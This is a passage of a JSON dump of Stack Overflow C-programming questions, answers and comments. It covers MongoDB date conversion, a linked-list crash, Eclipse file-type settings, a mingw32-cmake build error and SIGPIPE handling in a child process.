parsedTime-&gt;tm_hour = hour;\n    parsedTime-&gt;tm_min = minutes;\n    parsedTime-&gt;tm_sec = seconds;\n    newTime = mktime(parsedTime);\n    unsigned long long millis = newTime * 1000;\n    return millis;\n\n  }\n return 0;\n }\n</code></pre>\n"}], "owner": {"reputation": 2696, "user_id": 1352426, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/mQFHO.png?s=128&g=1", "display_name": "v0d1ch", "link": "https://stackoverflow.com/users/1352426/v0d1ch"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 480, "favorite_count": 0, "accepted_answer_id": 33132634, "answer_count": 1, "score": 0, "last_activity_date": 1444846344, "creation_date": 1444824262, "last_edit_date": 1444829161, "question_id": 33124789, "link": "https://stackoverflow.com/questions/33124789/c-mongodb-driver-datetime-update", "title": "C MongoDB driver DateTime update", "body": "<p>Ok this is the scenario. I am reading txt file and inserting/updating (with bulk operations ) data to mongodb.\nInserting part works fine since I am creating bson document in a loop and doing mongoc_bulk_operation_insert.</p>\n\n<p>My date comes in a format of 11:37:17.253 SAST JUN 05 2015 \nso I run it trough the function that removes  .253 and SAST\n and feed it to the convert_to_date function that you see down in the text.</p>\n\n<p>This is how I create timestamp and append the date to the document:</p>\n\n<pre><code>int convert_to_date(char *dateString)\n{\nstruct tm *parsedTime;\ntime_t rawTime;\ntime_t newTime;\nint hour, minutes, seconds, millis, year, month, day;\n\nif (sscanf(dateString, \"%d:%d:%d      %d %d %d\",\n    &amp;hour, &amp;minutes, &amp;seconds, &amp;month, &amp;day, &amp;year) != EOF) {\n    time(&amp;rawTime);\n    parsedTime = localtime(&amp;rawTime);\n    parsedTime-&gt;tm_year = year - 1900;\n    parsedTime-&gt;tm_mon = month - 1;\n    parsedTime-&gt;tm_mday = day;\n    parsedTime-&gt;tm_hour = hour;\n    parsedTime-&gt;tm_min = minutes;\n    parsedTime-&gt;tm_sec = seconds;\n    newTime = mktime(parsedTime);\n\n    return newTime;\n}\nreturn 0;\n}\n\n/* this is somewhere in a loop */\n\ntime_t t = convert_to_date(s1);\nbson_append_time_t(doc, field_map[y], strlen(field_map[y]), t);\n// and after all if insert is supposed to happen i call\n// mongoc_bulk_operation_insert(bulk, doc);\n// and mongoc_bulk_operation_execute(bulk, &amp;reply, &amp;error);\n</code></pre>\n\n<p>That part is just fine when I look at the database I get \nISODate(\"2015-06-05T09:37:17.000Z\")</p>\n\n<p>So ther problem is when I try to update existing record.</p>\n\n<p>When i do update i need to do a $set on all of the fields I want to update(upsert actually and I didnt find a way to update complete document at once) \nit looks like this:</p>\n\n<pre><code>//update document with sessionid\nquery = BCON_NEW(\"SessionId\", BCON_UTF8(sid));\nupdate = BCON_NEW(\"$set\", \"{\", \"SomeDateTimeField\", \n                   BCON_DATE_TIME(ystack[y]), \"}\");\nmongoc_bulk_operation_update(bulk, query, update, true);\n</code></pre>\n\n<p>The value of ystack[y] is 1433497048 which is valid timestamp but\n i get in the db ISODate(\"1970-01-17T14:11:37.037Z\")\nI also found an example online for inserting the whole bson object as date like this:</p>\n\n<pre><code>int64_t currentTime = time(NULL) * 1000;\nbson_t *date = BCON_NEW(\"$date\", BCON_DATE_TIME(currentTime));\nbson_t *update = BCON_NEW(\"$set\", \"{\", \"last_sync_time\", date, \"}\");                                                                                             \n</code></pre>\n\n<p>But this produces \\u0001 in the DB instead of valid date. I cant tell what is causing this, so much frustration for something that should be straight forward. This is the libbson api for the reference </p>\n\n<p><a href=\"https://api.mongodb.org/libbson/current/index.html\" rel=\"nofollow\">https://api.mongodb.org/libbson/current/index.html</a><br>\n  and c driver api<br>\n<a href=\"http://api.mongodb.org/c/1.1.8/\" rel=\"nofollow\">http://api.mongodb.org/c/1.1.8/</a>                                </p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1444824294, "post_id": 33124767, "comment_id": 54061978, "body": "Is it too much to ask that you format the question properly? Some nice person might do it for you out of (i) kindness, or (ii) +2 reputation gain, but don&#39;t count on it."}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1444824339, "post_id": 33124767, "comment_id": 54062012, "body": "There we go; kindness."}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "reply_to_user": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1444824368, "post_id": 33124767, "comment_id": 54062024, "body": "@Bathsheba  Just an enter :)"}, {"owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "edited": false, "score": 0, "creation_date": 1444824373, "post_id": 33124767, "comment_id": 54062029, "body": "So what&#39;s the compiler output?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1444824462, "post_id": 33124767, "comment_id": 54062102, "body": "Do you get errors when you build the program, or does the program crash (or otherwise stop working) when you run it? If you get build errors, then please edit the question to include the actual, complete and unedited output from the compiler and/or linker. My guess, though, is that you have a <i>crash</i>."}], "answers": [{"tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": false, "score": 3, "last_activity_date": 1444824695, "creation_date": 1444824695, "answer_id": 33124954, "question_id": 33124767, "link": "https://stackoverflow.com/questions/33124767/creating-circular-link-list-the-compiler-stops-working/33124954#33124954", "title": "creating circular link list the compiler stops working", "body": "<p>Like I said in my comment, my guess is that you have a <em>crash</em>, that the program stops when you run the program, and that it builds without errors.</p>\n\n<p>The reason is that you are using the local non-static variable <code>h</code> without initializing it. All local non-static variables have an <em>indeterminate</em> value unless initialized, and using those variable without initialization leads to <em>undefined behavior</em>.</p>\n\n<p>The solution is very simple: Allocate memory for a node (either as a normal variable or dynamically) and initialize the pointer <code>h</code> with that.</p>\n\n<p>Most compilers are actually capable of detecting problems of this kind, but since it's syntactically and semantically legal it will not issue an error, but a warning instead. And if you don't get such a warning then you need to enable more warnings.</p>\n"}], "owner": {"reputation": 9, "user_id": 5257503, "user_type": "registered", "profile_image": "https://graph.facebook.com/416147618544432/picture?type=large", "display_name": "Prajwal Chadaga", "link": "https://stackoverflow.com/users/5257503/prajwal-chadaga"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 31, "favorite_count": 0, "answer_count": 1, "score": -3, "last_activity_date": 1444824695, "creation_date": 1444824207, "last_edit_date": 1444824329, "question_id": 33124767, "link": "https://stackoverflow.com/questions/33124767/creating-circular-link-list-the-compiler-stops-working", "title": "creating circular link list the compiler stops working", "body": "<p>the compiler stops working ,pls give me some solution</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\ntypedef struct\n{\n    int data;\n    struct node *next;\n}node;\nnode * create()\n{\n    node *p;\n    p=malloc(sizeof(node));\n    p-&gt;next=NULL;\n    return p;\n}\nvoid add(node **h,int ele)\n{   node *temp;\n    temp=(*h);\n    node *p=create();\n    while(temp-&gt;next!=temp)\n    temp=temp-&gt;next;\n    temp-&gt;next=p;\n    p-&gt;next=temp;\n    p-&gt;data=ele;\n    (*h)=temp;\n\n}\n\n\nvoid main()\n{   int ch,ele;\n    node *h;\n    h-&gt;next=h;\n\n    do\n    {   printf(\"\\n1 add 2 delete 3 insert at kth position 4 delete at kth position\");\n        scanf(\"%d\",&amp;ch);\n\n        if(ch==1)\n        {\n        scanf(\"%d\",&amp;ele);\n        add(&amp;h,ele);\n    }\n    //if(ch==2)\n\n    }while(ch!=5);\n\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "eclipse", "ide"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1444823469, "post_id": 33124436, "comment_id": 54061475, "body": "That seems stupid. The big compilers uses the file-ending to know what kind of language it&#39;s compiling. If a file is ending in <code>.c</code> then the compiler will compile it as a C source file, and if you&#39;re unlucky the compiler front-end program won&#39;t have an option to tell it otherwise."}, {"owner": {"reputation": 33210, "user_id": 211659, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/31c59c3ebec3e38517c37e8b1d5cb9de?s=128&d=identicon&r=PG", "display_name": "\u0160imon T&#243;th", "link": "https://stackoverflow.com/users/211659/%c5%a0imon-t%c3%b3th"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1444823633, "post_id": 33124436, "comment_id": 54061578, "body": "@JoachimPileborg Thanks, that is an extremely helpful comment."}, {"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1444823709, "post_id": 33124436, "comment_id": 54061633, "body": "you can convert all them to C++ , click project name then menu then New-&gt; C++ project and then convert to and select C++ project."}, {"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1444823803, "post_id": 33124436, "comment_id": 54061689, "body": "There&#39;s <code>Preferences-&gt;C&#47;C++-&gt;Language Mappings</code> where you apparently can tell Eclipse that C files are C++.  What it actually does, I don&#39;t know though."}, {"owner": {"reputation": 33210, "user_id": 211659, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/31c59c3ebec3e38517c37e8b1d5cb9de?s=128&d=identicon&r=PG", "display_name": "\u0160imon T&#243;th", "link": "https://stackoverflow.com/users/211659/%c5%a0imon-t%c3%b3th"}, "reply_to_user": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1444823860, "post_id": 33124436, "comment_id": 54061728, "body": "@ameyCU This project will not show up in the list. Most likely because it is already a C++ project."}, {"owner": {"reputation": 33210, "user_id": 211659, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/31c59c3ebec3e38517c37e8b1d5cb9de?s=128&d=identicon&r=PG", "display_name": "\u0160imon T&#243;th", "link": "https://stackoverflow.com/users/211659/%c5%a0imon-t%c3%b3th"}, "reply_to_user": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1444824807, "post_id": 33124436, "comment_id": 54062352, "body": "@nos This seems like it would be the right setting, it even re-runs the indexer if you change it, but <code>.c</code> files still don&#39;t see C++ headers."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1444825059, "post_id": 33124436, "comment_id": 54062518, "body": "Do you have problems only with the IDE, or is it problems when you are attempting to build the project? If it&#39;s the latter and you&#39;re using GCC try adding the option <code>-x c++</code> (which tells GCC to build as C++ instead of the deducted C)."}, {"owner": {"reputation": 33210, "user_id": 211659, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/31c59c3ebec3e38517c37e8b1d5cb9de?s=128&d=identicon&r=PG", "display_name": "\u0160imon T&#243;th", "link": "https://stackoverflow.com/users/211659/%c5%a0imon-t%c3%b3th"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1444825119, "post_id": 33124436, "comment_id": 54062559, "body": "@JoachimPileborg Just the IDE"}], "answers": [{"comments": [{"owner": {"reputation": 33210, "user_id": 211659, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/31c59c3ebec3e38517c37e8b1d5cb9de?s=128&d=identicon&r=PG", "display_name": "\u0160imon T&#243;th", "link": "https://stackoverflow.com/users/211659/%c5%a0imon-t%c3%b3th"}, "edited": false, "score": 0, "creation_date": 1444827511, "post_id": 33125814, "comment_id": 54064198, "body": "It&#39;s still complaining about unresolved includes, but the indexer seems to index the files correctly now."}], "tags": [], "owner": {"reputation": 3752, "user_id": 1001195, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/dda89cff7f47651fbeee18a90949873b?s=128&d=identicon&r=PG", "display_name": "dau_sama", "link": "https://stackoverflow.com/users/1001195/dau-sama"}, "is_accepted": true, "score": 3, "last_activity_date": 1444827027, "creation_date": 1444827027, "answer_id": 33125814, "question_id": 33124436, "link": "https://stackoverflow.com/questions/33124436/force-eclipse-to-treat-c-files-as-c/33125814#33125814", "title": "Force Eclipse to treat .c files as C++", "body": "<p>Enter in </p>\n\n<p><code>Preferences-&gt;C/C++-&gt;FileTypes</code></p>\n\n<p>You can see the file association there. It doesn't let me change it in my Eclipse Luna CDT, but what you can do is to override it per project.</p>\n\n<p><code>Properties-&gt;C/C++ General-&gt;FileTypes-&gt;Use project settings</code></p>\n"}], "owner": {"reputation": 33210, "user_id": 211659, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/31c59c3ebec3e38517c37e8b1d5cb9de?s=128&d=identicon&r=PG", "display_name": "\u0160imon T&#243;th", "link": "https://stackoverflow.com/users/211659/%c5%a0imon-t%c3%b3th"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1103, "favorite_count": 0, "accepted_answer_id": 33125814, "answer_count": 1, "score": 4, "last_activity_date": 1444827027, "creation_date": 1444823164, "question_id": 33124436, "link": "https://stackoverflow.com/questions/33124436/force-eclipse-to-treat-c-files-as-c", "title": "Force Eclipse to treat .c files as C++", "body": "<p>I'm working with an external project that uses <code>.c</code> file extension for C++ files (they will not change this, I have even sent them a full patch).</p>\n\n<p>Is there any way to force Eclipse (autotools project) to index all <code>.c</code>/<code>.h</code> files as C++?</p>\n"}, {"tags": ["c", "compiler-errors", "cross-compiling", "fedora", "vala"], "comments": [{"owner": {"reputation": 6615, "user_id": 1034226, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d46a52d500f3e8bc02ec60a08a3f189b?s=128&d=identicon&r=PG", "display_name": "apmasell", "link": "https://stackoverflow.com/users/1034226/apmasell"}, "edited": false, "score": 3, "creation_date": 1444825859, "post_id": 33124261, "comment_id": 54063065, "body": "It means that a shell script is trying to run a program in the background, but the shell doesn&#39;t support doing that. Non-interactive shells (those running scripts) are not supposed to allow this by default, but some shells do. So, this script might work with another shell as <code>&#47;bin&#47;sh</code>. This is a bug in that script."}, {"owner": {"reputation": 5905, "user_id": 2104879, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/fnwnh.jpg?s=128&g=1", "display_name": "mertyildiran", "link": "https://stackoverflow.com/users/2104879/mertyildiran"}, "reply_to_user": {"reputation": 6615, "user_id": 1034226, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d46a52d500f3e8bc02ec60a08a3f189b?s=128&d=identicon&r=PG", "display_name": "apmasell", "link": "https://stackoverflow.com/users/1034226/apmasell"}, "edited": false, "score": 0, "creation_date": 1444826186, "post_id": 33124261, "comment_id": 54063321, "body": "I tried: <code>bash mingw32-cmake .. -DUSE_ZEITGEIST=0 -DUSE_GTK3=1 -DCMAKE_INSTALL_PREFIX=&#47;usr&#47;i686-w64-mingw32&#47;sys-root&#47;mingw -DCMAKE_VERBOSE_MAKEFILE=0</code> Same error. I don&#39;t understand you clearly please help me."}, {"owner": {"reputation": 5905, "user_id": 2104879, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/fnwnh.jpg?s=128&g=1", "display_name": "mertyildiran", "link": "https://stackoverflow.com/users/2104879/mertyildiran"}, "reply_to_user": {"reputation": 6615, "user_id": 1034226, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d46a52d500f3e8bc02ec60a08a3f189b?s=128&d=identicon&r=PG", "display_name": "apmasell", "link": "https://stackoverflow.com/users/1034226/apmasell"}, "edited": false, "score": 0, "creation_date": 1444826350, "post_id": 33124261, "comment_id": 54063438, "body": "@apmasell Are telling me that I have to run this command in a subshell?"}, {"owner": {"reputation": 6615, "user_id": 1034226, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d46a52d500f3e8bc02ec60a08a3f189b?s=128&d=identicon&r=PG", "display_name": "apmasell", "link": "https://stackoverflow.com/users/1034226/apmasell"}, "edited": false, "score": 1, "creation_date": 1445207070, "post_id": 33124261, "comment_id": 54212694, "body": "No. I&#39;m saying there&#39;s an error in the script. It should probably enable job control with <code>set -m</code>."}, {"owner": {"reputation": 5905, "user_id": 2104879, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/fnwnh.jpg?s=128&g=1", "display_name": "mertyildiran", "link": "https://stackoverflow.com/users/2104879/mertyildiran"}, "reply_to_user": {"reputation": 6615, "user_id": 1034226, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d46a52d500f3e8bc02ec60a08a3f189b?s=128&d=identicon&r=PG", "display_name": "apmasell", "link": "https://stackoverflow.com/users/1034226/apmasell"}, "edited": false, "score": 0, "creation_date": 1445214640, "post_id": 33124261, "comment_id": 54214491, "body": "@apmasell What do you mean with <code>set -m</code>. Could you post an answer with a brief explanation, please?"}, {"owner": {"reputation": 6615, "user_id": 1034226, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d46a52d500f3e8bc02ec60a08a3f189b?s=128&d=identicon&r=PG", "display_name": "apmasell", "link": "https://stackoverflow.com/users/1034226/apmasell"}, "edited": false, "score": 2, "creation_date": 1445221326, "post_id": 33124261, "comment_id": 54216036, "body": "This is a bug in <code>mingw32-cmake</code>. You should report it to the upstream developers."}, {"owner": {"reputation": 5905, "user_id": 2104879, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/fnwnh.jpg?s=128&g=1", "display_name": "mertyildiran", "link": "https://stackoverflow.com/users/2104879/mertyildiran"}, "reply_to_user": {"reputation": 6615, "user_id": 1034226, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d46a52d500f3e8bc02ec60a08a3f189b?s=128&d=identicon&r=PG", "display_name": "apmasell", "link": "https://stackoverflow.com/users/1034226/apmasell"}, "edited": false, "score": 0, "creation_date": 1445223051, "post_id": 33124261, "comment_id": 54216482, "body": "@apmasell hmm OK then, thank you."}, {"owner": {"reputation": 27556, "user_id": 1277510, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/8473546b3dd0a3488911a2590dea6103?s=128&d=identicon&r=PG", "display_name": "elmarco", "link": "https://stackoverflow.com/users/1277510/elmarco"}, "edited": false, "score": 0, "creation_date": 1579520526, "post_id": 33124261, "comment_id": 105782194, "body": "@mertyildiran I have a similar error with mingw32-meson. Did you open a bug? Did you solve it in the end. Very curious error :)"}, {"owner": {"reputation": 27556, "user_id": 1277510, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/8473546b3dd0a3488911a2590dea6103?s=128&d=identicon&r=PG", "display_name": "elmarco", "link": "https://stackoverflow.com/users/1277510/elmarco"}, "edited": false, "score": 0, "creation_date": 1579520902, "post_id": 33124261, "comment_id": 105782412, "body": "@mertyildiran hmm indeed, the answer 1 helps. I didn&#39;t install correctly meson. I wonder if we could improve the error message to make this more obvious..."}], "answers": [{"tags": [], "owner": {"reputation": 2705, "user_id": 2777984, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/71beaf59b30140ee9c5a012e7fc511be?s=128&d=identicon&r=PG&f=1", "display_name": "Roberto", "link": "https://stackoverflow.com/users/2777984/roberto"}, "is_accepted": true, "score": 4, "last_activity_date": 1452023514, "creation_date": 1452023514, "answer_id": 34620096, "question_id": 33124261, "link": "https://stackoverflow.com/questions/33124261/usr-bin-mingw32-cmake-line-84-fg-no-job-control-midori-cross-compiling-erro/34620096#34620096", "title": "/usr/bin/mingw32-cmake: line 84: fg: no job control (Midori cross-compiling error)", "body": "<p>FWIW: I had the same error message trying to build a project of mine. It went away after </p>\n\n<pre><code>yum install cmake \n</code></pre>\n\n<p>Both <code>mingw32-cmake</code> and <code>mingw64-cmake</code> need <code>cmake</code> to function. (Actually, make that <code>dnf install cmake</code> nowadays.)</p>\n"}], "owner": {"reputation": 5905, "user_id": 2104879, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/fnwnh.jpg?s=128&g=1", "display_name": "mertyildiran", "link": "https://stackoverflow.com/users/2104879/mertyildiran"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 825, "favorite_count": 0, "accepted_answer_id": 34620096, "answer_count": 1, "score": 4, "last_activity_date": 1452023514, "creation_date": 1444822558, "question_id": 33124261, "link": "https://stackoverflow.com/questions/33124261/usr-bin-mingw32-cmake-line-84-fg-no-job-control-midori-cross-compiling-erro", "title": "/usr/bin/mingw32-cmake: line 84: fg: no job control (Midori cross-compiling error)", "body": "<p>I'm trying to compile <a href=\"http://midori-browser.org\" rel=\"nofollow\">Midori Web Browser</a> for Windows on Fedora 22. For that purpose I'm following <a href=\"http://midori-browser.org/contribute/#for_linux_developers\" rel=\"nofollow\">this tutorial</a>.</p>\n\n<p>I installed these dependencies except faenza-icon-theme:</p>\n\n<pre><code>yum install gcc vala intltool\nyum install libsoup-devel webkitgtk3-devel sqlite-devel\nyum install mingw{32,64}-webkitgtk3 mingw{32,64}-glib-networking mingw{32,64}-gdb mingw{32,64}-gstreamer-plugins-good\nyum install faenza-icon-theme p7zip mingw32-nsis greybird-gtk3-theme\n</code></pre>\n\n<p>Later I installed faenzai-icon-theme via using a <a href=\"http://rpm.pbone.net/index.php3/stat/4/idpl/30430169/dir/fedora_22/com/faenza-icon-theme-1.3-1.1.noarch.rpm.html\" rel=\"nofollow\">third party rpm</a>.</p>\n\n<p>I downloaded source:</p>\n\n<pre><code>bzr branch lp:midori\ncd midori\nmkdir _mingw32\ncd _mingw32\n</code></pre>\n\n<p>But at this step:</p>\n\n<pre><code>mingw32-cmake .. -DUSE_ZEITGEIST=0 -DUSE_GTK3=1 -DCMAKE_INSTALL_PREFIX=/usr/i686-w64-mingw32/sys-root/mingw -DCMAKE_VERBOSE_MAKEFILE=0\n</code></pre>\n\n<p>I'm getting an error:</p>\n\n<pre><code>/usr/bin/mingw32-cmake: line 84: fg: no job control\n</code></pre>\n\n<p>I don't know how to solve this problem and the meaning of this error. I made a research on internet but nothing came up.</p>\n"}, {"tags": ["c", "pipe", "fdopen"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1444820259, "post_id": 33123423, "comment_id": 54059536, "body": "Search for <code>SIGPIPE</code>, and tutorials on how to handle (or ignore) signals."}, {"owner": {"reputation": 541, "user_id": 3167354, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/FNXWv.png?s=128&g=1", "display_name": "Bababarghi", "link": "https://stackoverflow.com/users/3167354/bababarghi"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1444820515, "post_id": 33123423, "comment_id": 54059689, "body": "@JoachimPileborg hmmm... Thats sounds more complicated than what I initially thought. Is that the only option I &#39;ve got?"}, {"owner": {"reputation": 4857, "user_id": 1405614, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e9a70943a5d825c32446259aa7e9348?s=128&d=identicon&r=PG", "display_name": "Valeri Atamaniouk", "link": "https://stackoverflow.com/users/1405614/valeri-atamaniouk"}, "edited": false, "score": 0, "creation_date": 1444820556, "post_id": 33123423, "comment_id": 54059713, "body": "No, you can use <code>signalfd()</code> + <code>poll()</code> (or similar)"}], "answers": [{"comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "reply_to_user": {"reputation": 541, "user_id": 3167354, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/FNXWv.png?s=128&g=1", "display_name": "Bababarghi", "link": "https://stackoverflow.com/users/3167354/bababarghi"}, "edited": false, "score": 0, "creation_date": 1444820926, "post_id": 33123660, "comment_id": 54059927, "body": "@Bababarghi Just add the line early during your applications initialization code."}, {"owner": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 1, "creation_date": 1444820970, "post_id": 33123660, "comment_id": 54059949, "body": "Must everyone be spoon-fed? Literally copy-and-paste the line of code he&#39;s given you, throw it at the top of <code>main()</code>, and remain blissfully ignorant. Otherwise, you can read more about signals and understand how they affect your program, and how you can control them."}], "tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": true, "score": 0, "last_activity_date": 1444820690, "creation_date": 1444820690, "answer_id": 33123660, "question_id": 33123423, "link": "https://stackoverflow.com/questions/33123423/how-to-ignore-empty-pipes-in-child-process/33123660#33123660", "title": "How to ignore empty pipes in CHILD process?", "body": "<p>It's actually very simple, you just need to ignore the <code>SIGPIPE</code> signal, and it's done with a single function-call:</p>\n\n<pre><code>signal(SIGPIPE, SIG_IGN);\n</code></pre>\n\n<p>When the pipe is empty, instead of raising the <code>SIGPIPE</code> signal, reading from the pipe will return an end-of-file value (the underlying <code>read</code> system-call will return <code>0</code>).</p>\n"}], "owner": {"reputation": 541, "user_id": 3167354, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/FNXWv.png?s=128&g=1", "display_name": "Bababarghi", "link": "https://stackoverflow.com/users/3167354/bababarghi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 64, "favorite_count": 0, "accepted_answer_id": 33123660, "answer_count": 1, "score": 0, "last_activity_date": 1444820690, "creation_date": 1444819972, "question_id": 33123423, "link": "https://stackoverflow.com/questions/33123423/how-to-ignore-empty-pipes-in-child-process", "title": "How to ignore empty pipes in CHILD process?", "body": "<p>I am using a subroutine named <code>read_from_pipe</code> in my <code>child</code> process as below to read whatever is in the pipe and display it:</p>\n\n<pre><code>void read_from_pipe(int fileDescriptr)\n{\n    FILE *stream;\n    int c;\n    if (fileDesc_Is_Valid(fileDescriptr) == TRUE)\n    {\n        stream = fdopen(fileDescriptr, \"r\");\n        while ((c = fgetc(stream)) != EOF)\n            putchar(c);                                     \n        fclose(stream);\n    }\n    else                                                     \n        perror(\"Reading from pipe failed --&gt;\");\n}\n</code></pre>\n\n<p><code>fileDesc_Is_Valid</code> is another subroutine which checks the existance of file descriptor.</p>\n\n<p>The problem is that because I have used <code>waitpid(pid, 